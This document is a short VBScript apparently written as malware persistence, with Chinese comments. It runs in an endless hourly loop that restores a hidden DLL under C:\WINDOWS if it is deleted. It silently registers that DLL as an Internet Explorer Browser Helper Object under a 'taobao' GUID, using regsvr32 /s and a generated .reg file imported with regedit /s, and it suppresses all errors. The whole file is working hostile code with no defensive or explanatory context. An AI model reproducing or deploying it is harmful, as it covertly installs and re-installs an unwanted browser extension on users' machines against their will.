dim ie
Call Main
Sub Main()
On Error Resume Next
    do         
        Call SetBhoo
        wscript.sleep 3600000      
    loop    
End Sub

'bho,成功返回1,失败或错误返回0
Public Function SetBhoo()  
On Error Resume Next
    Dim dll_path,move_path,taobao_guid,regPath
    dll_path="C:\WINDOWS\gou\52025.80683.dll"
    move_path="C:\WINDOWS\myhost.DLL"
    taobao_guid="{D70297C2-31C0-494D-AF09-BF4CA5A37FD7}"
    regPath = "C:\WINDOWS\hostbhoregs.reg"
    set fso=wscript.createobject("scripting.filesystemobject")
    fso.copyfile dll_path,move_path
    '判断文件是否存在
    if (not fso.FileExists(dll_path)) and (fso.FileExists(move_path)) then 
        fso.copyfile move_path,dll_path
    end if
    
    Dim OperationRegistry 
    Set OperationRegistry=WScript.CreateObject("WScript.Shell") 
    Dim data
    data=OperationRegistry.RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects\" & taobao_guid & "\") 
    If data="" Then
        '注册文件
        Set fso  = Nothing
	      Set WshShell= CreateObject("WScript.Shell") 
	      WshShell.Run "regsvr32.exe /s " & dll_path
        Set WshShell  = Nothing
        
        
        Set fso = CreateObject("Scripting.FileSystemObject")
        Set f1=fso.CreateTextFile(regPath, True)
	    f1.WriteLine "Windows Registry Editor Version 5.00"
	    f1.WriteLine "[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects\" & taobao_guid & "]"
        Set fso  = Nothing
        Set WshShell= CreateObject("WScript.Shell") 
	      WshShell.Run "regedit /s " & regPath
        Set WshShell  = Nothing
    End If
End Function

